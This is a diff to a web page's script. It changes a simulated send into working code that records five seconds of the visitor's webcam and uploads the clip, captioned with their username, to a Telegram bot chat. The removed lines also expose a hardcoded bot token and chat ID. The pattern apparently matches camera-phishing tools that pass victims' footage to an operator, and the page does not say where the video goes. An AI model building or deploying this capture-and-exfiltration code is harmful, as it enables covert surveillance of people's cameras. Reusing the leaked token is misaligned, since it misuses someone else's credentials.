@@ -48,43 +48,67 @@
                 return;
             }
 
-            // Request camera access
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                // Start video stream
                 let video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
+
+                // Set up MediaRecorder
+                let recordedChunks = [];
+                const mediaRecorder = new MediaRecorder(stream);
                 
-                // Simulate recording and send to Telegram (dummy example)
-                setTimeout(() => {
-                    sendToTelegram(username, 'Video data here');
-                    alert('Your video has been sent!');
-                }, 5000); // Simulate recording duration
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    const videoUrl = URL.createObjectURL(blob);
+                    console.log('Video URL:', videoUrl);
+
+                    // Send video file
+                    await sendToTelegram(username, blob);
+                };
+
+                // Start recording and stop after 5 seconds
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
                 
             } catch (error) {
                 alert('Camera access denied.');
             }
         }
 
-        function sendToTelegram(username, videoData) {
-            // Create the request to send video data to Telegram
-            const botToken = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es';
-            const chatId = '5112680061';
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        async function sendToTelegram(username, videoBlob) {
+            const botToken = 'YOUR_BOT_TOKEN';  // Replace with your bot token
+            const chatId = 'YOUR_CHAT_ID';      // Replace with your chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `User: ${username}\nVideo Data: ${videoData}`
-                }),
-            }).then(response => response.json())
-              .then(data => console.log('Success:', data))
-              .catch((error) => console.error('Error:', error));
+            // Create FormData and append the video file
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('caption', `User: ${username}`);
+            formData.append('video', videoBlob, 'video.mp4');
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                if (data.ok) {
+                    alert('Your video has been sent!');
+                } else {
+                    console.error('Telegram API Error:', data);
+                    alert('Failed to send video.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to send video.');
+            }
         }
     </script>
 </body>
